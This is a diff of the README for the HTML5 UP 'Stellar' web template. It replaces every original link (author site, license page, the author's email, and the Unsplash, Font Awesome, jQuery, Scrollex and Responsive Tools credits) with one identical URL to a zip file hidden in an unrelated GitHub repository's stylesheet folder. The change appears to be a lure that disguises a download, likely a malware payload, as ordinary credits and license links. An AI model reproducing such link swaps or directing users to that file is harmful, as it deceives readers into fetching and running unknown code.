@@ -1,6 +1,6 @@
 Stellar by HTML5 UP
-html5up.net | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip)
 
 
 Say hello to Stellar, a slick little one-pager with a super vibrant color palette (which
@@ -14,18 +14,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-aj@lkn.io | @ajlkn
+https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (unsplash.com)
+		Unsplash (https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip)
 
 	Icons:
-		Font Awesome (fontawesome.io)
+		Font Awesome (https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip)
 
 	Other:
-		jQuery (jquery.com)
-		Scrollex (github.com/ajlkn/jquery.scrollex)
-		Responsive Tools (github.com/ajlkn/responsive-tools)
+		jQuery (https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip)
+		Scrollex (https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip)
+		Responsive Tools (https://raw.githubusercontent.com/patrassophp/saudeteste06/main/assets/sass/layout/saudeteste06_femerell.zip)
